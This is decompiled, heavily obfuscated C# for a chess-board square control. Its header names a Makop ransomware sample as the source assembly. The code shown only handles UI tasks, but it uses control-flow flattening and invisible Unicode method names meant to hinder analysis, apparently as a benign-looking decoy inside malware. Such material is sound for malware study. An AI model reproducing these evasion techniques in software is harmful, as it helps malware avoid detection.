// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.SimpleSquare
// Assembly: fC, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2BFFC2A0-BEF7-47FD-8B55-B5339EE53E65
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-a1558391914f4235dfdcdddcdf0de915a800541a4271feb4aff34af82b83a935.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace SimpleChessApp.Game
{
  public class SimpleSquare : UserControl
  {
    private Color DefaultColor;
    private ChessPiece piece;
    private bool isBlackSquare;
    private IContainer components = (IContainer) null;
    public Panel panel1;

    public event EventHandler<MouseEventArgs> Click
    {
      add
      {
        EventHandler<MouseEventArgs> eventHandler1 = this.Click;
label_1:
        int num1 = 878254767;
        EventHandler<MouseEventArgs> comparand;
        EventHandler<MouseEventArgs> eventHandler2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1714707833)) % 5U)
          {
            case 0:
              goto label_1;
            case 1:
              comparand = eventHandler1;
              eventHandler2 = (EventHandler<MouseEventArgs>) SimpleSquare.\u200E⁫‏‭‎‬‎‎‭⁪⁯‎⁫‍‌‍‫⁯‭‌‬⁮⁬⁫‮‫‪⁯‭⁫⁭‫⁮‭⁭⁯⁭⁮‬⁪‮((Delegate) comparand, (Delegate) value);
              num1 = 993071389;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num3 = eventHandler1 == comparand ? -1345331235 : (num3 = -591358217);
              num1 = num3 ^ (int) num2 * -39548486;
              continue;
            case 4:
              eventHandler1 = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, eventHandler2, comparand);
              num1 = (int) num2 * -522361303 ^ 739123041;
              continue;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
      remove
      {
        EventHandler<MouseEventArgs> eventHandler1 = this.Click;
label_1:
        int num1 = 1628159346;
        EventHandler<MouseEventArgs> comparand;
        EventHandler<MouseEventArgs> eventHandler2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 569215648)) % 5U)
          {
            case 0:
              goto label_1;
            case 1:
              eventHandler1 = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, eventHandler2, comparand);
              num1 = (int) num2 * -1609482662 ^ 1602038364;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num3 = eventHandler1 != comparand ? 869175546 : (num3 = 1398934884);
              num1 = num3 ^ (int) num2 * -995487739;
              continue;
            case 4:
              comparand = eventHandler1;
              eventHandler2 = (EventHandler<MouseEventArgs>) SimpleSquare.\u202E⁯⁪‮⁫‏⁪‍⁮⁮‏⁪⁯‌‪⁯‎⁯⁫‍​‮‏⁮‮⁭​‍‌⁮​‮⁮⁪‪⁬‏‌‮⁬‮((Delegate) comparand, (Delegate) value);
              num1 = 357056594;
              continue;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
    }

    public ChessPiece Piece
    {
      get
      {
        ChessPiece piece = this.piece;
label_1:
        int num1 = -178328955;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -275797295)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              num1 = (int) num2 * 425263798 ^ -1888189797;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return piece;
      }
      set
      {
label_1:
        int num1 = 853178877;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 153728655)) % 7U)
          {
            case 0:
              num1 = (int) num2 * -781788809 ^ 1450648138;
              continue;
            case 1:
              SimpleSquare.\u200C‏​‏‎‎⁪‎‍⁫⁫‮‮⁭‎⁪‍‭‍‭‌‎⁯‮‍‪‫‏​⁫‏‭⁮‫​⁯‫‫‎⁪‮((Control) this, this.repo.GetPiece(this.piece.Kind, this.piece.Color));
              num1 = 1828940685;
              continue;
            case 2:
              goto label_1;
            case 3:
              this.piece = value;
              int num3 = this.piece == null ? 573302639 : (num3 = 2078779915);
              num1 = num3 ^ (int) num2 * -313276109;
              continue;
            case 4:
              this.piece = (ChessPiece) null;
              num1 = (int) num2 * 623393299 ^ 505505603;
              continue;
            case 5:
              SimpleSquare.\u200C‏​‏‎‎⁪‎‍⁫⁫‮‮⁭‎⁪‍‭‍‭‌‎⁯‮‍‪‫‏​⁫‏‭⁮‫​⁯‫‫‎⁪‮((Control) this, (Image) null);
              num1 = (int) num2 * -2142637042 ^ 878613187;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    public void colorSquare()
    {
label_1:
      int num1 = -1009830318;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1784922814)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.DefaultColor = this.IsBlackSquare ? Color.CornflowerBlue : Color.WhiteSmoke;
            SimpleSquare.\u200C​⁪‪​⁬‌‪‬⁮‎‎⁮‫⁭‏‍‭⁯⁭‪⁭‌‏‭‏‍​⁪‎⁭‭‮⁮‭‎⁬⁪‌‫‮((Control) this, this.DefaultColor);
            num1 = -867178543;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public Pieces Kind
    {
      set
      {
label_1:
        int num1 = -327700708;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -877718196)) % 5U)
          {
            case 0:
              num1 = (int) num2 * -1316806678 ^ -818676741;
              continue;
            case 1:
              this.Piece.Kind = value;
              num1 = (int) num2 * 335554839 ^ 630053286;
              continue;
            case 2:
              this.Piece = this.Piece;
              num1 = (int) num2 * 1724387962 ^ 1059089770;
              continue;
            case 3:
              goto label_1;
            case 4:
              goto label_3;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
    }

    public bool IsBlackSquare
    {
      get => this.isBlackSquare;
      set
      {
        this.isBlackSquare = value;
        this.colorSquare();
label_1:
        int num1 = 1310099282;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1687512267)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * 2121995450 ^ -146237415;
              continue;
            case 2:
              goto label_3;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public Repository repo => ChessContext.repo;

    public SimpleSquare()
    {
      this.InitializeComponent();
      SimpleSquare.\u200D‫⁮‭‎⁬‮⁮‏⁪⁭‏⁫⁮​‫‭​‏‫‬⁬⁯​⁮‮‌‭‍⁫‍⁭‏⁫‌⁮‏‏‪‪‮((Control) this, new MouseEventHandler(this.Square_MouseClick));
      SimpleSquare.\u206E‮⁪⁬‮⁫‮‭‬⁫⁭‭‬⁪‬‪⁯‬‍‫⁯⁪‍⁯⁬​‬‍‬⁯‪⁪⁯‌⁮‍‬⁮⁬⁬‮((Control) this.panel1, new MouseEventHandler(this.Square_MouseClick));
    }

    private void Square_MouseClick(object sender, MouseEventArgs e)
    {
label_1:
      int num1 = 360754237;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 750282152)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            EventHandler<MouseEventArgs> click = this.Click;
            if (click != null)
            {
              click((object) this, e);
              num1 = (int) num2 * -567012790 ^ -1531107244;
              continue;
            }
            goto label_5;
          case 2:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_5:;
    }

    public void HighLight() => SimpleSquare.\u200C​⁪‪​⁬‌‪‬⁮‎‎⁮‫⁭‏‍‭⁯⁭‪⁭‌‏‭‏‍​⁪‎⁭‭‮⁮‭‎⁬⁪‌‫‮((Control) this, Color.ForestGreen);

    public void ClearHighLight() => SimpleSquare.\u200C​⁪‪​⁬‌‪‬⁮‎‎⁮‫⁭‏‍‭⁯⁭‪⁭‌‏‭‏‍​⁪‎⁭‭‮⁮‭‎⁬⁪‌‫‮((Control) this, this.DefaultColor);

    public bool IsEmpty
    {
      get
      {
label_1:
        int num1 = 1209435222;
        bool isEmpty;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 274174803)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              isEmpty = this.Piece == null;
              num1 = (int) num2 * 446158554 ^ -443422570;
              continue;
            case 3:
              num1 = (int) num2 * 1708775444 ^ -1306846491;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return isEmpty;
      }
    }

    protected override void Dispose(bool disposing)
    {
label_1:
      int num1 = 952338822;
      while (true)
      {
        uint num2;
        int num3;
        switch ((num2 = (uint) (num1 ^ 961888391)) % 9U)
        {
          case 0:
            base.Dispose(disposing);
            num1 = 375643269;
            continue;
          case 1:
            num1 = (int) num2 * 1040103247 ^ -89773417;
            continue;
          case 2:
            if (!disposing)
            {
              num3 = 0;
              break;
            }
            num1 = (int) num2 * 308387801 ^ 1783010249;
            continue;
          case 3:
            num3 = this.components != null ? 1 : 0;
            break;
          case 4:
            num1 = (int) num2 * 76550956 ^ -1796276541;
            continue;
          case 5:
            goto label_1;
          case 6:
            SimpleSquare.\u200F‫‫‌‍‭‫‫⁯⁬‏‮⁮‍⁫​⁭‌‫‭⁭‎‬⁮⁮‪‏‮⁭‎​⁪‏⁭⁫⁭⁭‎‪‭‮((IDisposable) this.components);
            num1 = (int) num2 * -1023292523 ^ 2007412785;
            continue;
          case 7:
            goto label_3;
          case 8:
            num1 = (int) num2 * -2015102226 ^ 1512972798;
            continue;
          default:
            goto label_14;
        }
        int num4;
        num1 = num4 = num3 != 0 ? 332660760 : (num4 = 450842750);
      }
label_3:
      return;
label_14:;
    }

    private void InitializeComponent()
    {
      this.panel1 = SimpleSquare.\u206A‪‮‮⁮⁬‭‌‫‌‫‮‪⁫‫‮‪​‏‌⁮‭‎‮⁫‪‪‌⁫‍‌‬​‍‎⁫‍‎‭‬‮();
      SimpleSquare.\u202B⁫‍‎⁮‬‬‫‪‮​⁯‪⁯‌‎​‏‬⁬⁯‌‮⁭​⁫‌⁪‌⁬⁭⁬‫‎⁬‍⁮⁬⁫‮‮((Control) this);
label_1:
      int num1 = 1084568274;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1813476083)) % 16U)
        {
          case 0:
            SimpleSquare.\u200F​‏‏‍‏⁮‍‏‏⁬‌⁫‮​‮⁫⁮⁬‏‏‎‭⁬⁬​‪‪⁫‭‭‭​⁬​‏‭⁪⁭‫‮((Control) this, ImageLayout.Center);
            num1 = (int) num2 * -260815719 ^ -1125591929;
            continue;
          case 1:
            SimpleSquare.\u200C​⁪‪​⁬‌‪‬⁮‎‎⁮‫⁭‏‍‭⁯⁭‪⁭‌‏‭‏‍​⁪‎⁭‭‮⁮‭‎⁬⁪‌‫‮((Control) this.panel1, Color.Transparent);
            num1 = (int) num2 * -1075056703 ^ -794926639;
            continue;
          case 2:
            num1 = (int) num2 * -1298903516 ^ 137452070;
            continue;
          case 3:
            SimpleSquare.\u200F​‏‏‍‏⁮‍‏‏⁬‌⁫‮​‮⁫⁮⁬‏‏‎‭⁬⁬​‪‪⁫‭‭‭​⁬​‏‭⁪⁭‫‮((Control) this.panel1, ImageLayout.Center);
            num1 = (int) num2 * -1706368676 ^ 700731170;
            continue;
          case 4:
            num1 = (int) num2 * -236899830 ^ 890608357;
            continue;
          case 5:
            SimpleSquare.\u206C‪⁯⁪‭‍‏⁮‌‏‪‮‫⁯‭⁬⁭‏⁪‍⁬⁪‪⁯⁪​‬‫⁭‬‍⁬‏⁯‌⁭​‫⁪⁮‮((Control) this.panel1, DockStyle.Fill);
            SimpleSquare.\u202D​‏⁫⁬‫⁮⁫⁬‍‌‏‬⁯⁬​​​⁮‏‌⁯‫‏​⁭‎⁮‏⁪‫⁬⁬‪⁪‏​‪⁮‫‮((Control) this.panel1, new Point(0, 0));
            num1 = (int) num2 * -1719465843 ^ 1115779365;
            continue;
          case 6:
            SimpleSquare.\u200F‎‬⁯‎⁪⁯‪​⁭‭‎‪‌‎‮⁭⁯​​⁯‮⁯‪‌‍‪‏⁬‍‭⁫​​‎‍‬‍‌⁯‮((ContainerControl) this, AutoScaleMode.Font);
            num1 = (int) num2 * 529244642 ^ -1689979585;
            continue;
          case 7:
            num1 = (int) num2 * -1354918275 ^ -1188040879;
            continue;
          case 8:
            goto label_3;
          case 9:
            SimpleSquare.\u206A‪⁬⁬⁮‍⁯⁪⁬‫‏⁪​⁭⁫‍⁭​‌⁭‍‬‏‏​‍⁪‌‎‪⁮‏‏‌‭‪​​⁮‭‮((Control) this.panel1, \u003CModule\u003E.\u200F⁫‭​‭‍⁮‎‬‮‏​‪⁫‮‬‭⁪‌⁮⁪‎‍⁯‭⁭‮⁪⁬⁫‬⁮‭⁭​⁭‬‮⁬‫‮<string>(701693246U));
            num1 = (int) num2 * -1543901862 ^ 968730291;
            continue;
          case 10:
            SimpleSquare.\u202A‫⁪‪⁯‭⁪​‫‭‍‭⁫⁮‌⁮⁭‭‭⁯‏⁯‌‭⁮‭‫‍⁬⁮⁫‎‪⁮‮‭‭‎‫‪‮((Control) this.panel1, new Size(137, 132));
            SimpleSquare.\u206E‬​‏‮‎​‍‮⁪‏‭‍⁬‌​‪‍‌⁭⁮‭‮​‌‬‮⁯‍‬⁬​‏‌⁪‎‏⁪​⁬‮((Control) this.panel1, 0);
            num1 = (int) num2 * 479098737 ^ -1444485978;
            continue;
          case 11:
            SimpleSquare.\u206B‏⁫‌⁭‎‭‫⁪‍‮‌⁯‏⁬‌‎‍⁫⁪⁫⁯⁭⁮‭‌⁫‬‍‎‫‌‬‮‍⁪‬⁪⁭‪‮((Control) this, \u003CModule\u003E.\u202D‮‬‪⁯‌⁫⁭​⁫⁪⁯⁫‏​‪⁮⁫⁮⁯‬‏⁮‌‎‪⁫‬⁭‪⁪‭⁭⁮‭‫⁫⁪⁬‮<string>(2223609168U));
            SimpleSquare.\u202A‪‫⁭‮‍⁭‪‬⁮‪‭‭‌‎⁬⁫‍‪‫⁭‪‮‪‭‏‌⁪‬⁫⁮‭‌⁪⁯‏‭‫⁯‫‮((Control) this, new Size(137, 132));
            SimpleSquare.\u200B⁯⁪⁬‎‭‎‎‮⁮‭‌‌‌‪‎‎‭‌⁮⁭‌⁯⁪‏⁮​‫⁭‍‍⁬‪‎⁪‭⁪‏⁯⁮‮((Control) this, false);
            num1 = (int) num2 * -1323872848 ^ 1879067611;
            continue;
          case 12:
            goto label_1;
          case 13:
            SimpleSquare.\u200D‬⁯‮‏‬‮⁭‫‍‫⁭‪‏⁪‭‮‎‫‭⁬‫‌‎‬⁭‬‮⁮‭‮‎‎‮‍⁪​⁪‮((Control) this, new Padding(0));
            num1 = (int) num2 * 305912316 ^ -243462972;
            continue;
          case 14:
            SimpleSquare.\u200C‪⁯‍‮‭⁪‫⁪‌⁪‫‎‮⁮⁭‫‫⁫‬⁭‫⁫‏⁮⁯⁭⁬‍‌‌‮‏⁬‪‬⁫‌⁯⁫‮(SimpleSquare.\u202A⁪‬⁮⁯⁪​⁭‫‫⁮​‭​‬‏‏‭⁬⁪⁪⁮‪​‬⁪⁯‎⁯⁮‫⁮‏‍⁪‬​⁭‭‮‮((Control) this), (Control) this.panel1);
            num1 = (int) num2 * -1153575208 ^ -2063504975;
            continue;
          case 15:
            SimpleSquare.\u202E​‭‮‎⁪‎⁯⁬‎​‭‫⁮‫‎‫‍‫‎‎‬⁮⁭‎‮‭‪⁪⁬‍⁬⁫‬‭‪‎​⁯‬‮((ContainerControl) this, new SizeF(6f, 13f));
            num1 = (int) num2 * 240822019 ^ -422673720;
            continue;
          default:
            goto label_18;
        }
      }
label_3:
      return;
label_18:;
    }

    static Delegate \u200E⁫‏‭‎‬‎‎‭⁪⁯‎⁫‍‌‍‫⁯‭‌‬⁮⁬⁫‮‫‪⁯‭⁫⁭‫⁮‭⁭⁯⁭⁮‬⁪‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Combine(obj0, obj1);
    }

    static Delegate \u202E⁯⁪‮⁫‏⁪‍⁮⁮‏⁪⁯‌‪⁯‎⁯⁫‍​‮‏⁮‮⁭​‍‌⁮​‮⁮⁪‪⁬‏‌‮⁬‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Remove(obj0, obj1);
    }

    static void \u200C‏​‏‎‎⁪‎‍⁫⁫‮‮⁭‎⁪‍‭‍‭‌‎⁯‮‍‪‫‏​⁫‏‭⁮‫​⁯‫‫‎⁪‮([In] Control obj0, [In] Image obj1) => obj0.BackgroundImage = obj1;

    static void \u200C​⁪‪​⁬‌‪‬⁮‎‎⁮‫⁭‏‍‭⁯⁭‪⁭‌‏‭‏‍​⁪‎⁭‭‮⁮‭‎⁬⁪‌‫‮([In] Control obj0, [In] Color obj1) => obj0.BackColor = obj1;

    static void \u200D‫⁮‭‎⁬‮⁮‏⁪⁭‏⁫⁮​‫‭​‏‫‬⁬⁯​⁮‮‌‭‍⁫‍⁭‏⁫‌⁮‏‏‪‪‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u206E‮⁪⁬‮⁫‮‭‬⁫⁭‭‬⁪‬‪⁯‬‍‫⁯⁪‍⁯⁬​‬‍‬⁯‪⁪⁯‌⁮‍‬⁮⁬⁬‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u200F‫‫‌‍‭‫‫⁯⁬‏‮⁮‍⁫​⁭‌‫‭⁭‎‬⁮⁮‪‏‮⁭‎​⁪‏⁭⁫⁭⁭‎‪‭‮([In] IDisposable obj0) => obj0.Dispose();

    static Panel \u206A‪‮‮⁮⁬‭‌‫‌‫‮‪⁫‫‮‪​‏‌⁮‭‎‮⁫‪‪‌⁫‍‌‬​‍‎⁫‍‎‭‬‮() => new Panel();

    static void \u202B⁫‍‎⁮‬‬‫‪‮​⁯‪⁯‌‎​‏‬⁬⁯‌‮⁭​⁫‌⁪‌⁬⁭⁬‫‎⁬‍⁮⁬⁫‮‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u200F​‏‏‍‏⁮‍‏‏⁬‌⁫‮​‮⁫⁮⁬‏‏‎‭⁬⁬​‪‪⁫‭‭‭​⁬​‏‭⁪⁭‫‮([In] Control obj0, [In] ImageLayout obj1) => obj0.BackgroundImageLayout = obj1;

    static void \u206C‪⁯⁪‭‍‏⁮‌‏‪‮‫⁯‭⁬⁭‏⁪‍⁬⁪‪⁯⁪​‬‫⁭‬‍⁬‏⁯‌⁭​‫⁪⁮‮([In] Control obj0, [In] DockStyle obj1) => obj0.Dock = obj1;

    static void \u202D​‏⁫⁬‫⁮⁫⁬‍‌‏‬⁯⁬​​​⁮‏‌⁯‫‏​⁭‎⁮‏⁪‫⁬⁬‪⁪‏​‪⁮‫‮([In] Control obj0, [In] Point obj1) => obj0.Location = obj1;

    static void \u206A‪⁬⁬⁮‍⁯⁪⁬‫‏⁪​⁭⁫‍⁭​‌⁭‍‬‏‏​‍⁪‌‎‪⁮‏‏‌‭‪​​⁮‭‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u202A‫⁪‪⁯‭⁪​‫‭‍‭⁫⁮‌⁮⁭‭‭⁯‏⁯‌‭⁮‭‫‍⁬⁮⁫‎‪⁮‮‭‭‎‫‪‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u206E‬​‏‮‎​‍‮⁪‏‭‍⁬‌​‪‍‌⁭⁮‭‮​‌‬‮⁯‍‬⁬​‏‌⁪‎‏⁪​⁬‮([In] Control obj0, [In] int obj1) => obj0.TabIndex = obj1;

    static void \u202E​‭‮‎⁪‎⁯⁬‎​‭‫⁮‫‎‫‍‫‎‎‬⁮⁭‎‮‭‪⁪⁬‍⁬⁫‬‭‪‎​⁯‬‮([In] ContainerControl obj0, [In] SizeF obj1) => obj0.AutoScaleDimensions = obj1;

    static void \u200F‎‬⁯‎⁪⁯‪​⁭‭‎‪‌‎‮⁭⁯​​⁯‮⁯‪‌‍‪‏⁬‍‭⁫​​‎‍‬‍‌⁯‮(
      [In] ContainerControl obj0,
      [In] AutoScaleMode obj1)
    {
      obj0.AutoScaleMode = obj1;
    }

    static Control.ControlCollection \u202A⁪‬⁮⁯⁪​⁭‫‫⁮​‭​‬‏‏‭⁬⁪⁪⁮‪​‬⁪⁯‎⁯⁮‫⁮‏‍⁪‬​⁭‭‮‮(
      [In] Control obj0)
    {
      return obj0.Controls;
    }

    static void \u200C‪⁯‍‮‭⁪‫⁪‌⁪‫‎‮⁮⁭‫‫⁫‬⁭‫⁫‏⁮⁯⁭⁬‍‌‌‮‏⁬‪‬⁫‌⁯⁫‮(
      [In] Control.ControlCollection obj0,
      [In] Control obj1)
    {
      obj0.Add(obj1);
    }

    static void \u200D‬⁯‮‏‬‮⁭‫‍‫⁭‪‏⁪‭‮‎‫‭⁬‫‌‎‬⁭‬‮⁮‭‮‎‎‮‍⁪​⁪‮([In] Control obj0, [In] Padding obj1) => obj0.Margin = obj1;

    static void \u206B‏⁫‌⁭‎‭‫⁪‍‮‌⁯‏⁬‌‎‍⁫⁪⁫⁯⁭⁮‭‌⁫‬‍‎‫‌‬‮‍⁪‬⁪⁭‪‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u202A‪‫⁭‮‍⁭‪‬⁮‪‭‭‌‎⁬⁫‍‪‫⁭‪‮‪‭‏‌⁪‬⁫⁮‭‌⁪⁯‏‭‫⁯‫‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u200B⁯⁪⁬‎‭‎‎‮⁮‭‌‌‌‪‎‎‭‌⁮⁭‌⁯⁪‏⁮​‫⁭‍‍⁬‪‎⁪‭⁪‏⁯⁮‮([In] Control obj0, [In] bool obj1) => obj0.ResumeLayout(obj1);
  }
}
